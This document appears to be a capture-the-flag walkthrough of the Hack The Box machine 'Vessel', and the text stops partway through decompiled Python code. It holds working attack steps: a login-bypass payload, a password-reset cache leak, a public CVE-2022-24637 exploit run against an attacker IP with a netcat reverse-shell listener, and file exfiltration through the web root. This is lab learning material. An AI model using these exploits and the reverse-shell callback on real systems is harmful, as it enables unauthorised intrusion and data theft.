Let's begin with adding the relevant endpoint to `/etc/hosts`:

```bash
echo "10.10.11.178	vessel.htb" | sudo tee -a /etc/hosts
```

- Let's fire off `autorecon` for background scans. Right away we can see that port `80` is open.

```bash
sudo (which autorecon) vessel.htb
```

- Let's run `feroxbuster` for additional endpoints:

```bash
feroxbuster -u http://vessel.htb -t 5 -L 5 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o ferox_vessel_out.txt
```

- Note, I seen `/dev` right away. I chose a smaller word-list to finish the `non-recursive` scan so I could have it saved and further enumerate on `/dev`. I ran the initial `feroxbuster` scan again, but it was irrelevant.

```bash
feroxbuster -u http://vessel.htb -n -t 5 -L 5 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox_vessel_out.txt
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230314220403.png)

- For `/dev/` endpoint simple remove the `-n` switch to allow for `recurisive` scanning.

```bash
feroxbuster -u http://vessel.htb/dev -t 5 -L 5 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox_vessel_out.txt
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230314220445.png)


- Find `/dev/.git` then use `gitdumper.sh`. This failed, but the `python` version of `git-dumper` worked following this attempt.

```bash
./Scripts/gitdumper.sh http://vessel.htb/dev/.git/ git
```

- Remove the failed `/git` directory and restart again. If `git-dumper` is not installed then install.

```bash
rm -rf git
pip3 install git-dumper
git-dumper http://vessel.htb/dev git
```

- At `/route/index.js`

```js
  60   │ router.post('/api/login', function(req, res) {
  61   │     let username = req.body.username;
  62   │     let password = req.body.password;
  63   │     if (username && password) {
  64   │         connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, pass
       │ word], function(error, results, fields) {
  65   │             if (error) throw error;
  66   │             if (results.length > 0) {
  67   │                 req.session.loggedin = true;
  68   │                 req.session.username = username;
  69   │                 req.flash('success', 'Succesfully logged in!');
  70   │                 res.redirect('/admin');
  71   │             } else {
  72   │                 req.flash('error', 'Wrong credentials! Try Again!');
  73   │                 res.redirect('/login');
  74   │             }           
  75   │             res.end();
  76   │         });

```

- In a POST request we can change:

```bash
username=admin&password=test
```

- to:

```bash
username=admin&password[password]=1
```

- If you doing your due diligence you would've already tried logging in as both `ethan@vessel.htb` and `admin@vessel.htb` and tried resetting the password.
- `admin` is a valid username:

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315065531.png)

- By changing the above request it reads as:

```sql
SELECT * FROM accounts WHERE username = admin AND password[password] = 1',
```

- The `password` object is executed and it collects password 1 which is the admins.
- Note you will have to use `burp` and turn on intercept prior to this. Redirects to the admin page don't seem to work.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315065852.png)

- One of two things may have happened by now.
- A: you were running a subdomain finder and located the domain using `/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt`.
	- `ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://vessel.htb/ -H 'Host: FUZZ.vessel.htb' -t 100 -c -fl 244`
		- This took `1.31hr` that I ran in background.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315011541.png)

- B: You got into the dashboard at `http://vessel.htb/admin` and manually browsed through the admin drop-down menu and noticed the `subdomain` within the error message.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315070243.png)

- Adjust your `/etc/hosts` fille:

```bash
cat /etc/hosts | tail -1

10.10.11.178	vessel.htb openwebanalytics.vessel.htb
```

- You will be met with an additional log in screen.
- `Open web analytic's` repository can be found here:
	- [[https://github.com/Open-Web-Analytics/Open-Web-Analytics]]
	- It has been a while since this exploit has been in the wild. There has been a fix. You will have to grab an older copy of the repository.

```bash
wget https://github.com/Open-Web-Analytics/Open-Web-Analytics/archive/refs/tags/1.7.2.zip
```

- The two step exploit that will be executed will be found here:
	- [[https://devel0pment.de/?p=2494]]

- Visit:
	- [[https://www.md5hashgenerator.com/]]
	- Generate a hash for `id1`.
	- Take note of the `md5sum` hash:
		- `fafe1b60c24107ccd8f4562213e44849`
			- Note that `echo 'id1' | md5sum` does not work.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315072248.png)

- Visit the reset password page:

```bash
http://openwebanalytics.vessel.htb/index.php?owa_do=base.passwordResetForm
```

- Reset `admin@vessel.htb`.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315072039.png)

- Use the `md5sum` followed by `.php` where the `cached` reset password data will be stored.
	- Due to single quotes used the `\n` was ignored thus rendering the initial `php` code vulnerable.
		- Remedies would be `echo -e '<php\n/*'` or `echo "<php\n/*"` which they later acknowledged.

```bash
curl http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php

<?php\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJDBCNlpyM0NieC5yMmNRY2ZVRThLMC5TTUV4M1lBQ2J2UVYyTzhIV0VkdnZQQlFEalBHbnMyIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiIxMzA0NGI5YzBiNzcxZDNlZjlkOGFmYzgzNzM3YTM3NyI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/\n?>
```

- Decode the below content:

```bash
echo "Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJDBCNlpyM0NieC5yMmNRY2ZVRThLMC5TTUV4M1lBQ2J2UVYyTzhIV0VkdnZQQlFEalBHbnMyIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiIxMzA0NGI5YzBiNzcxZDNlZjlkOGFmYzgzNzM3YTM3NyI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9" | base64 -d | tee decoded.txt
```

- Let's make it easier to locate the `temp_key` value we need:

```bash
grep temp_passkey decoded.txt
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315073025.png)

- Now we are going to visit:

```bash
http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersChangePassword
```

- Go to `burp` proxy settings and select `unhide hidden form fields`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315073337.png)

- Alternatively, ensure your POST request looks similar too:

```bash
owa_password=test&owa_password2=test&owa_k=temp_passkey_here&owa_action=base.usersChangePassword&owa_submit_btn=Save+Your+New+Password
```

- The warning claims your password must be at least `6` characters, but this is false.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315073647.png)

- There is a script that is running in the background that clears the passkey after so long.
- Bear in mind you may have to repeat the previous steps and use the most recent `temp_passkey`.
- The results will look similar too:

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315073901.png)


- Following the second half of the chained exploit we can find the first two github repositories.
- GoogleFu:
	- `openwebanalytics exploit`

```bash
# test & verify
wget https://www.exploit-db.com/raw/51026
mv 51026 test.py
python test.py -u admin -p test -c openwebanalytics.vessel.htb:80  10.10.16.5 4444
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315074320.png)

- Start a `nc` listener:

```bash
nc -lvnp 4444
```

- Execute the exploit:

```bash
# exploit
wget https://raw.githubusercontent.com/garySec/CVE-2022-24637/main/exploit.py
python exploit.py openwebanalytics.vessel.htb:80 10.10.16.9 4444
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315074337.png)

- Let's get a better shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

- After some manual enumeration and checking out `/etc/passwd` you find `ethan` and `steven`. We have access to `steven's` `/home` directory.
- Let's transfer over the files of interest.

```bash
cp passwordGenerator /var/www/html/owa/owa-data/logs
cp .notes/notes.pdf /var/www/html/owa/owa-data/logs
cp .notes/screenshot.png /var/www/html/owa/owa-data/logs
```

- On host:

```bash
mkdir from_vessel
cd from_vessel
wget http://openwebanalytics.vessel.htb/owa-data/logs/passwordGenerator
wget http://openwebanalytics.vessel.htb/owa-data/logs/.notes/notes.pdf
wget http://openwebanalytics.vessel.htb/owa-data/logs/.notes/screenshot.png
```

- Run strings on `passwordGenerator` to determine it is `python` related:

```bash
strings passwordGenerator
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315075747.png)

- We are going to extra the relevant data:

```bash
wget https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py
python pyinstxtractor.py passwordGenerator
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315075834.png)

- Since this is `python 3.7` I fired up a docker container.

```bash
cd /opt/python3.7
```

- Here is the `Dockerfile` I used:

```bash
FROM python:3.7

RUN apt-get update && \
    apt-get install -y git && \
    git clone https://github.com/SecureAuthCorp/impacket.git && \
    cd impacket && \
    pip install .

CMD ["/bin/bash"]
```

- Build the docker image based off of the `Dockerfile`.

```bash
docker build -t impacket-python37 .
```

- Start the container with a `/bin/bash` prompt.

```bash
docker run -it impacket-python37
```

- Use this to determine the `docker ID`

```bash
docker ps --all
```

- Transfer all the relevant files from the `from_vessel` directory into our `docker` container:

```bash
docker cp -r from_vessel/ 7010de5ec52d:/opt
```

- Install the additional dependencies needed:

```bash
pip install uncompyle6
cd /opt/from_vessel/passwordGenerator_extracted/
uncompyle6 passwordGenerator.pyc
```

- Here is the code:

```python
# uncompyle6 version 3.9.0
# Python bytecode version base 3.7.0 (3394)
# Decompiled from: Python 3.7.16 (default, Mar  1 2023, 16:08:07) 
# [GCC 10.2.1 20210110]
# Embedded file name: passwordGenerator.py
from PySide2.QtCore import *
from PySide2.QtGui import *
from PySide2.QtWidgets import *
from PySide2 import QtWidgets
import pyperclip

class Ui_MainWindow(object):

    def setupUi(self, MainWindow):
        if not MainWindow.objectName():
            MainWindow.setObjectName('MainWindow')
        MainWindow.resize(560, 408)
        self.centralwidget = QWidget(MainWindow)
        self.centralwidget.setObjectName('centralwidget')
        self.title = QTextBrowser(self.centralwidget)
        self.title.setObjectName('title')
        self.title.setGeometry(QRect(80, 10, 411, 51))
        self.textBrowser_2 = QTextBrowser(self.centralwidget)
        self.textBrowser_2.setObjectName('textBrowser_2')
        self.textBrowser_2.setGeometry(QRect(10, 80, 161, 41))
        self.generate = QPushButton(self.centralwidget)
        self.generate.setObjectName('generate')
        self.generate.setGeometry(QRect(140, 330, 261, 51))
        self.PasswordLength = QSpinBox(self.centralwidget)
        self.PasswordLength.setObjectName('PasswordLength')
        self.PasswordLength.setGeometry(QRect(30, 130, 101, 21))
        self.PasswordLength.setMinimum(10)
        self.PasswordLength.setMaximum(40)
        self.copyButton = QPushButton(self.centralwidget)
        self.copyButton.setObjectName('copyButton')
        self.copyButton.setGeometry(QRect(460, 260, 71, 61))
        self.textBrowser_4 = QTextBrowser(self.centralwidget)
        self.textBrowser_4.setObjectName('textBrowser_4')
        self.textBrowser_4.setGeometry(QRect(190, 170, 141, 41))
        self.checkBox = QCheckBox(self.centralwidget)
        self.checkBox.setObjectName('checkBox')
        self.checkBox.setGeometry(QRect(250, 220, 16, 17))
        self.checkBox.setCheckable(True)
        self.checkBox.setChecked(False)
        self.checkBox.setTristate(False)
        self.comboBox = QComboBox(self.centralwidget)
        self.comboBox.addItem('')
        self.comboBox.addItem('')
        self.comboBox.addItem('')
        self.comboBox.setObjectName('comboBox')
        self.comboBox.setGeometry(QRect(350, 130, 161, 21))
        self.textBrowser_5 = QTextBrowser(self.centralwidget)
        self.textBrowser_5.setObjectName('textBrowser_5')
        self.textBrowser_5.setGeometry(QRect(360, 80, 131, 41))
        self.password_field = QLineEdit(self.centralwidget)
        self.password_field.setObjectName('password_field')
        self.password_field.setGeometry(QRect(100, 260, 351, 61))
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QStatusBar(MainWindow)
        self.statusbar.setObjectName('statusbar')
        MainWindow.setStatusBar(self.statusbar)
        self.retranslateUi(MainWindow)
        QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(QCoreApplication.translate('MainWindow', 'MainWindow', None))
        self.title.setDocumentTitle('')
        self.title.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:20pt;">Secure Password Generator</span></p></body></html>', None))
        self.textBrowser_2.setDocumentTitle('')
        self.textBrowser_2.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:14pt;">Password Length</span></p></body></html>', None))
        self.generate.setText(QCoreApplication.translate('MainWindow', 'Generate!', None))
        self.copyButton.setText(QCoreApplication.translate('MainWindow', 'Copy', None))
        self.textBrowser_4.setDocumentTitle('')
        self.textBrowser_4.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:14pt;">Hide Password</span></p></body></html>', None))
        self.checkBox.setText('')
        self.comboBox.setItemText(0, QCoreApplication.translate('MainWindow', 'All Characters', None))
        self.comboBox.setItemText(1, QCoreApplication.translate('MainWindow', 'Alphabetic', None))
        self.comboBox.setItemText(2, QCoreApplication.translate('MainWindow', 'Alphanumeric', None))
        self.textBrowser_5.setDocumentTitle('')
